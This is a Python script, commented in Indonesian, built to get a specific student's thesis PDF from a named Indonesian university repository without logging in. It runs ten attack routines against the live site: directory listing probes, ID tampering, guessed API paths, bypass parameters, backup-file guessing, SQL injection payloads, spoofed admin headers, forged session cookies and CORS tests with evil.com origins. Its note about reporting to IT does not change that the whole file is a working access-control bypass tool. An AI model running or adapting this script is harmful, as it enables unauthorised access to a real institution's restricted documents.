import os
import sys
import io
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests
import json
import time
import hashlib
import re
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, urlencode
from bs4 import BeautifulSoup

class ExploitFinder:
    """
    MENCARI CELAH UNTUK DOWNLOAD PDF TANPA LOGIN
    Tujuan: Menemukan bug/kelemahan untuk dilaporkan ke tim IT
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://repository.mercubuana.ac.id"
        self.pdf_url = "https://repository.mercubuana.ac.id/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf"
        self.pdf_id = "70679"
        self.file_id = "3"
        self.filename = "BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf"
        
        self.vulnerabilities = []
        self.downloaded_files = []
        
        # Header beragam
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        self.session.headers.update(self.headers)
        
        os.makedirs("exploit_results", exist_ok=True)
    
    def log_exploit(self, name, method, detail, payload=None):
        """Catat exploit yang ditemukan"""
        exploit = {
            "name": name,
            "method": method,
            "detail": detail,
            "payload": payload,
            "timestamp": datetime.now().isoformat(),
            "severity": "CRITICAL"
        }
        self.vulnerabilities.append(exploit)
        print(f"\n🔥🔥🔥 EXPLOIT FOUND!")
        print(f"   Name: {name}")
        print(f"   Method: {method}")
        print(f"   Detail: {detail}")
        if payload:
            print(f"   Payload: {str(payload)[:200]}...")
        return exploit
    
    def save_pdf(self, content, name):
        """Simpan PDF yang berhasil didownload"""
        filename = f"exploit_results/{name}_{datetime.now().strftime('%H%M%S')}.pdf"
        with open(filename, "wb") as f:
            f.write(content)
        self.downloaded_files.append(filename)
        print(f"   💾 Saved: {filename}")
        return filename
    
    # ============================================================
    # EXPLOIT 1: DIRECTORY LISTING
    # ============================================================
    def exploit_directory_listing(self):
        """Coba akses folder tanpa index.html"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 1: DIRECTORY LISTING")
        print("="*70)
        
        paths = [
            "/70679/3/",
            "/70679/",
            "/70679/3/files/",
            "/70679/3/documents/",
            "/70679/3/pdf/",
            "/70679/3/download/",
            "/assets/",
            "/static/",
            "/media/",
            "/files/",
            "/uploads/",
            "/documents/",
            "/repository/",
            "/archive/",
            "/old/",
        ]
        
        for path in paths:
            try:
                url = f"{self.base_url}{path}"
                print(f"  📌 Testing: {url}")
                
                response = self.session.get(url, allow_redirects=True)
                
                # Check if directory listing is enabled
                if response.status_code == 200:
                    if "Index of" in response.text or "Directory" in response.text or "Parent Directory" in response.text:
                        self.log_exploit(
                            "Directory Listing",
                            f"GET {path}",
                            f"Directory listing ENABLED! Semua file di folder {path} terlihat!",
                            {"url": url}
                        )
                        # Save as proof
                        with open(f"exploit_results/dir_listing_{path.replace('/','_')}.html", "w") as f:
                            f.write(response.text[:2000])
                        return True
                    elif ".pdf" in response.text:
                        self.log_exploit(
                            "Directory Listing",
                            f"GET {path}",
                            f"Folder {path} menampilkan file PDF!",
                            {"url": url}
                        )
                        return True
                        
            except Exception as e:
                print(f"    ❌ Error: {e}")
        
        print("  ✅ Directory listing tidak ditemukan")
        return False
    
    # ============================================================
    # EXPLOIT 2: PATH TRAVERSAL VIA ID
    # ============================================================
    def exploit_id_manipulation(self):
        """Manipulasi ID untuk akses file lain"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 2: ID MANIPULATION")
        print("="*70)
        
        # Coba berbagai ID kombinasi
        ids = [
            ("70679", "3"),
            ("70679", "1"),
            ("70679", "2"),
            ("70679", "4"),
            ("70679", "5"),
            ("70678", "3"),
            ("70680", "3"),
            ("70679", "0"),
            ("70679", "all"),
            ("70679", "download"),
            ("70000", "3"),
            ("71000", "3"),
            ("70679", "file"),
        ]
        
        filenames = [
            self.filename,
            "BAB I Skripsi Adoniyya Fabiola - 43216110222.pdf",
            "43216110222.pdf",
            "skripsi.pdf",
            "thesis.pdf",
            "document.pdf",
            "file.pdf",
            "download.pdf",
            "output.pdf",
            "full.pdf",
        ]
        
        for doc_id, file_id in ids:
            for fname in filenames:
                try:
                    url = f"{self.base_url}/{doc_id}/{file_id}/{quote(fname)}"
                    print(f"  📌 Testing: {url[:80]}...")
                    
                    response = self.session.get(url, allow_redirects=True)
                    
                    if response.status_code == 200:
                        content_type = response.headers.get('Content-Type', '').lower()
                        if 'pdf' in content_type:
                            self.log_exploit(
                                "ID Manipulation",
                                f"GET {doc_id}/{file_id}/{fname}",
                                f"PDF berhasil diakses dengan ID berbeda!",
                                {"doc_id": doc_id, "file_id": file_id}
                            )
                            self.save_pdf(response.content, f"idor_{doc_id}_{file_id}")
                            return True
                            
                except Exception as e:
                    pass
        
        print("  ✅ ID manipulation tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 3: API ENDPOINT
    # ============================================================
    def exploit_api_endpoints(self):
        """Coba akses API untuk mendapatkan file"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 3: API ENDPOINTS")
        print("="*70)
        
        api_paths = [
            "/api/download/70679/3",
            "/api/file/70679/3",
            "/api/v1/download/70679/3",
            "/api/v2/download/70679/3",
            "/api/pdf/70679/3",
            "/api/document/70679/3",
            "/api/getfile/70679/3",
            "/api/filedownload/70679/3",
            "/api/70679/3/download",
            "/api/70679/3/file",
            "/api/public/download/70679/3",
            "/api/guest/download/70679/3",
            "/rest/download/70679/3",
            "/rest/file/70679/3",
            "/services/download/70679/3",
            "/services/file/70679/3",
            "/webservice/download/70679/3",
            "/ajax/download/70679/3",
            "/ajax/file/70679/3",
        ]
        
        for path in api_paths:
            try:
                url = f"{self.base_url}{path}"
                print(f"  📌 Testing: {url}")
                
                response = self.session.get(url, allow_redirects=True)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '').lower()
                    if 'pdf' in content_type:
                        self.log_exploit(
                            "API Endpoint",
                            f"GET {path}",
                            f"API endpoint {path} mengembalikan PDF!",
                            {"url": url}
                        )
                        self.save_pdf(response.content, f"api_{path.replace('/','_')}")
                        return True
                    elif 'json' in content_type:
                        try:
                            data = response.json()
                            if 'url' in data or 'path' in data or 'file' in data:
                                self.log_exploit(
                                    "API Endpoint",
                                    f"GET {path}",
                                    f"API {path} mengembalikan data yang mengandung URL file!",
                                    {"data": str(data)[:200]}
                                )
                                return True
                        except:
                            pass
                            
            except Exception as e:
                pass
        
        print("  ✅ API endpoints tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 4: PARAMETER INJECTION
    # ============================================================
    def exploit_parameter_injection(self):
        """Inject parameter untuk bypass"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 4: PARAMETER INJECTION")
        print("="*70)
        
        params = [
            ("action", ["download", "view", "get", "file", "pdf"]),
            ("mode", ["download", "view", "raw", "direct"]),
            ("type", ["pdf", "file", "download", "attachment"]),
            ("format", ["pdf", "file", "download"]),
            ("output", ["pdf", "file", "download", "attachment"]),
            ("download", ["true", "1", "yes", "on"]),
            ("force", ["true", "1", "yes", "on"]),
            ("direct", ["true", "1", "yes", "on"]),
            ("access", ["public", "guest", "all", "true"]),
            ("auth", ["public", "guest", "true", "1"]),
            ("token", ["public", "guest", "anonymous", "admin"]),
            ("key", ["public", "guest", "anonymous"]),
            ("secret", ["public", "guest", "anonymous"]),
            ("allow", ["true", "1", "yes", "all"]),
            ("permit", ["true", "1", "yes", "all"]),
        ]
        
        for param, values in params:
            for value in values:
                try:
                    test_url = f"{self.pdf_url}?{param}={value}"
                    print(f"  📌 Testing: {param}={value}")
                    
                    response = self.session.get(test_url, allow_redirects=True)
                    
                    if response.status_code == 200:
                        content_type = response.headers.get('Content-Type', '').lower()
                        if 'pdf' in content_type:
                            self.log_exploit(
                                "Parameter Injection",
                                f"{param}={value}",
                                f"PDF berhasil diakses dengan parameter injection!",
                                {param: value}
                            )
                            self.save_pdf(response.content, f"param_{param}_{value}")
                            return True
                            
                except Exception as e:
                    pass
        
        print("  ✅ Parameter injection tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 5: OLD/VULNERABLE VERSION
    # ============================================================
    def exploit_old_versions(self):
        """Coba akses versi lama/backup"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 5: OLD VERSIONS & BACKUPS")
        print("="*70)
        
        backups = [
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf.bak",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf.old",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf~",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf.backup",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf.tmp",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf_temp",
            "/70679/3/BAB%20I%20Skripsi%20Adoniyya%20Fabiola%20-%20%2043216110222.pdf_old",
            "/70679/3/backup/BAB%20I%20Skripsi%20Adoniyya%20Fabiola.pdf",
            "/70679/3/old/BAB%20I%20Skripsi%20Adoniyya%20Fabiola.pdf",
            "/70679/3/temp/BAB%20I%20Skripsi%20Adoniyya%20Fabiola.pdf",
            "/70679/3/.BAB%20I%20Skripsi%20Adoniyya%20Fabiola.pdf",
            "/70679/3/.#BAB%20I%20Skripsi%20Adoniyya%20Fabiola.pdf",
        ]
        
        for backup in backups:
            try:
                url = f"{self.base_url}{backup}"
                print(f"  📌 Testing: {url[:80]}...")
                
                response = self.session.get(url, allow_redirects=True)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '').lower()
                    if 'pdf' in content_type:
                        self.log_exploit(
                            "Old Versions",
                            f"GET {backup}",
                            f"Backup file {backup} dapat diakses!",
                            {"url": url}
                        )
                        self.save_pdf(response.content, f"backup_{hashlib.md5(backup.encode()).hexdigest()[:8]}")
                        return True
                        
            except Exception as e:
                pass
        
        print("  ✅ Tidak ada backup yang ditemukan")
        return False
    
    # ============================================================
    # EXPLOIT 6: MAGIC PARAMETERS
    # ============================================================
    def exploit_magic_params(self):
        """Coba magic parameters yang sering jadi celah"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 6: MAGIC PARAMETERS")
        print("="*70)
        
        magic_params = [
            "?debug=true",
            "?test=true",
            "?admin=true",
            "?override=true",
            "?bypass=true",
            "?ignore_auth=true",
            "?skip_auth=true",
            "?nocheck=true",
            "?noauth=true",
            "?public=true",
            "?guest=true",
            "?nologin=true",
            "?allow_any=true",
            "?force_download=true",
            "?inline=false",
            "?attachment=true",
            "?content-disposition=attachment",
        ]
        
        for magic in magic_params:
            try:
                test_url = f"{self.pdf_url}{magic}"
                print(f"  📌 Testing: {test_url[:80]}...")
                
                response = self.session.get(test_url, allow_redirects=True)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '').lower()
                    if 'pdf' in content_type:
                        self.log_exploit(
                            "Magic Parameters",
                            f"GET {magic}",
                            f"PDF berhasil diakses dengan magic parameter!",
                            {"param": magic}
                        )
                        self.save_pdf(response.content, f"magic_{hashlib.md5(magic.encode()).hexdigest()[:8]}")
                        return True
                        
            except Exception as e:
                pass
        
        print("  ✅ Magic parameters tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 7: SQL INJECTION TEST
    # ============================================================
    def exploit_sql_injection(self):
        """Test SQL injection pada parameter"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 7: SQL INJECTION TEST")
        print("="*70)
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "1' OR '1'='1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin'--",
            "' OR 'x'='x",
            "1' OR 1=1--",
        ]
        
        # Test pada berbagai parameter
        for payload in sql_payloads:
            try:
                # Test di URL
                test_url = f"{self.base_url}/{payload}/{self.file_id}/{self.filename}"
                response = self.session.get(test_url, allow_redirects=True)
                
                if response.status_code == 200 and 'pdf' in response.headers.get('Content-Type', '').lower():
                    self.log_exploit(
                        "SQL Injection",
                        f"GET /{payload}/{self.file_id}/...",
                        f"PDF berhasil diakses dengan SQL injection payload!",
                        {"payload": payload}
                    )
                    self.save_pdf(response.content, f"sql_{hashlib.md5(payload.encode()).hexdigest()[:8]}")
                    return True
                
                # Test di parameter
                test_url = f"{self.pdf_url}?id={payload}"
                response = self.session.get(test_url, allow_redirects=True)
                
                if response.status_code == 200 and 'pdf' in response.headers.get('Content-Type', '').lower():
                    self.log_exploit(
                        "SQL Injection",
                        f"?id={payload}",
                        f"PDF berhasil diakses dengan SQL injection!",
                        {"payload": payload}
                    )
                    self.save_pdf(response.content, f"sql_{hashlib.md5(payload.encode()).hexdigest()[:8]}")
                    return True
                    
            except Exception as e:
                pass
        
        print("  ✅ SQL injection tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 8: HEADER INJECTION DEEP
    # ============================================================
    def exploit_header_injection_deep(self):
        """Deep header injection testing"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 8: HEADER INJECTION DEEP")
        print("="*70)
        
        header_injections = {
            "X-Forwarded-Host": ["repository.mercubuana.ac.id", "localhost", "127.0.0.1"],
            "X-Forwarded-Proto": ["https", "http"],
            "X-Forwarded-Port": ["443", "80"],
            "X-Original-URL": [self.filename, f"/{self.pdf_id}/{self.file_id}/{self.filename}"],
            "X-Rewrite-URL": [self.filename, f"/{self.pdf_id}/{self.file_id}/{self.filename}"],
            "X-HTTP-Method-Override": ["GET", "POST", "PUT"],
            "X-Method-Override": ["GET", "POST"],
            "X-Requested-With": ["XMLHttpRequest"],
            "X-Requested-For": ["localhost", "127.0.0.1"],
            "From": ["admin@mercubuana.ac.id"],
            "X-Auth-User": ["admin", "root", "user"],
            "X-Server-IP": ["127.0.0.1"],
            "X-Host": ["repository.mercubuana.ac.id"],
            "X-Proxy": ["127.0.0.1"],
            "X-Proxy-Host": ["repository.mercubuana.ac.id"],
            "X-User-Agent": ["Mozilla/5.0"],
            "X-Forwarded-User": ["admin", "root"],
            "X-Forwarded-Server": ["repository.mercubuana.ac.id"],
            "X-Forwarded-Hostname": ["repository.mercubuana.ac.id"],
            "X-Forwarded-Auth": ["true", "1", "admin"],
        }
        
        for header, values in header_injections.items():
            for value in values:
                try:
                    headers = {header: value}
                    print(f"  📌 Testing: {header}: {value}")
                    
                    response = self.session.get(self.pdf_url, headers=headers, allow_redirects=True)
                    
                    if response.status_code == 200 and 'pdf' in response.headers.get('Content-Type', '').lower():
                        self.log_exploit(
                            "Header Injection Deep",
                            f"{header}: {value}",
                            f"PDF berhasil diakses dengan header injection!",
                            {header: value}
                        )
                        self.save_pdf(response.content, f"header_{header}_{hashlib.md5(value.encode()).hexdigest()[:8]}")
                        return True
                        
                except Exception as e:
                    pass
        
        print("  ✅ Deep header injection tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 9: SESSION PREDICTION
    # ============================================================
    def exploit_session_prediction(self):
        """Coba prediksi session ID"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 9: SESSION PREDICTION")
        print("="*70)
        
        # Ambil session dari response pertama
        try:
            first_response = self.session.get(self.base_url)
            session_cookie = self.session.cookies.get_dict()
            
            if session_cookie:
                print(f"  📌 Current session: {session_cookie}")
                
                # Coba variasi session
                session_variations = [
                    {"PHPSESSID": "admin"},
                    {"PHPSESSID": "1"},
                    {"PHPSESSID": "session"},
                    {"PHPSESSID": "12345"},
                    {"PHPSESSID": "root"},
                    {"JSESSIONID": "admin"},
                    {"SESSIONID": "admin"},
                    {"SESSID": "admin"},
                ]
                
                for cookies in session_variations:
                    test_session = requests.Session()
                    test_session.cookies.update(cookies)
                    test_session.headers.update(self.headers)
                    
                    response = test_session.get(self.pdf_url, allow_redirects=True)
                    
                    if response.status_code == 200 and 'pdf' in response.headers.get('Content-Type', '').lower():
                        self.log_exploit(
                            "Session Prediction",
                            f"Cookies: {cookies}",
                            f"PDF berhasil diakses dengan session prediction!",
                            {"cookies": cookies}
                        )
                        self.save_pdf(response.content, f"session_{hashlib.md5(str(cookies).encode()).hexdigest()[:8]}")
                        return True
                        
        except Exception as e:
            pass
        
        print("  ✅ Session prediction tidak berhasil")
        return False
    
    # ============================================================
    # EXPLOIT 10: CORS MISCONFIGURATION
    # ============================================================
    def exploit_cors(self):
        """Test CORS misconfiguration"""
        print("\n" + "="*70)
        print("🔍 EXPLOIT 10: CORS MISCONFIGURATION")
        print("="*70)
        
        origins = [
            "*",
            "null",
            "https://evil.com",
            "https://attacker.com",
            "https://hacker.com",
            "https://repository.mercubuana.ac.id.evil.com",
            "https://mercubuana.ac.id",
            "http://localhost:8080",
            "http://127.0.0.1:8000",
        ]
        
        for origin in origins:
            try:
                headers = {"Origin": origin}
                print(f"  📌 Testing Origin: {origin}")
                
                response = self.session.get(self.pdf_url, headers=headers, allow_redirects=True)
                
                # Check CORS headers
                cors_header = response.headers.get('Access-Control-Allow-Origin', '')
                if cors_header:
                    self.log_exploit(
                        "CORS Misconfiguration",
                        f"Origin: {origin}",
                        f"CORS header found: Access-Control-Allow-Origin: {cors_header}",
                        {"origin": origin, "cors_header": cors_header}
                    )
                    return True
                    
            except Exception as e:
                pass
        
        print("  ✅ Tidak ada CORS misconfiguration")
        return False
    
    # ============================================================
    # GENERATE REPORT
    # ============================================================
    def generate_exploit_report(self):
        """Generate laporan exploit yang ditemukan"""
        print("\n" + "="*80)
        print("📋 LAPORAN EXPLOIT & CELAH KEAMANAN")
        print("="*80)
        print(f"Tanggal Testing: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {self.pdf_url}")
        print("="*80)
        
        if self.vulnerabilities:
            print(f"\n🔥 DITEMUKAN {len(self.vulnerabilities)} CELAH KEAMANAN!")
            print("\n" + "="*80)
            print("📌 DETAIL CELAH:")
            print("="*80)
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['name']}")
                print(f"   Method: {vuln['method']}")
                print(f"   Detail: {vuln['detail']}")
                if vuln.get('payload'):
                    print(f"   Payload: {vuln['payload']}")
                print(f"   Severity: {vuln.get('severity', 'CRITICAL')}")
                print("-"*50)
            
            if self.downloaded_files:
                print(f"\n📂 Berhasil mendownload {len(self.downloaded_files)} file:")
                for f in self.downloaded_files:
                    print(f"   • {f}")
            
            print("\n" + "="*80)
            print("🔧 REKOMENDASI PERBAIKAN DARURAT:")
            print("="*80)
            print("\n1. SEGERA TUTUP SEMUA CELAH YANG DITEMUKAN!")
            print("2. Implementasikan autentikasi yang lebih ketat")
            print("3. Validasi semua input dan parameter")
            print("4. Nonaktifkan directory listing")
            print("5. Hapus file backup dari server")
            print("6. Implementasikan rate limiting")
            print("7. Gunakan CSRF token")
            print("8. Update semua komponen sistem")
            print("9. Audit keamanan menyeluruh")
            print("10. Ganti session ID yang mudah ditebak")
            
        else:
            print("\n✅ TIDAK DITEMUKAN CELAH!")
            print("Sistem keamanan berfungsi dengan baik.")
            print("\n📌 Rekomendasi:")
            print("   • Pertahankan keamanan yang sudah baik")
            print("   • Lakukan pentesting berkala")
            print("   • Update sistem secara rutin")
        
        print("\n" + "="*80)
        
        # Simpan laporan
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.pdf_url,
            "total_exploits_found": len(self.vulnerabilities),
            "downloaded_files": self.downloaded_files,
            "exploits": self.vulnerabilities,
        }
        
        with open("exploit_results/laporan_keamanan.json", "w") as f:
            json.dump(report, f, indent=2)
        print("\n📄 Laporan tersimpan di: exploit_results/laporan_keamanan.json")

# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    print("="*80)
    print("🔥 EXPLOIT FINDER - MENCARI CELAH KEAMANAN")
    print("="*80)
    print("📌 TUJUAN: Menemukan celah untuk download PDF tanpa login")
    print("⚠️  HANYA UNTUK TESTING KEAMANAN RESMI")
    print("="*80)
    
    finder = ExploitFinder()
    
    # Jalankan semua exploit
    finder.exploit_directory_listing()
    finder.exploit_id_manipulation()
    finder.exploit_api_endpoints()
    finder.exploit_parameter_injection()
    finder.exploit_old_versions()
    finder.exploit_magic_params()
    finder.exploit_sql_injection()
    finder.exploit_header_injection_deep()
    finder.exploit_session_prediction()
    finder.exploit_cors()
    
    # Generate report
    finder.generate_exploit_report()
    
    print("\n" + "="*80)
    print("✅ TESTING SELESAI")
    print("📁 Hasil tersimpan di folder: exploit_results/")
    print("="*80)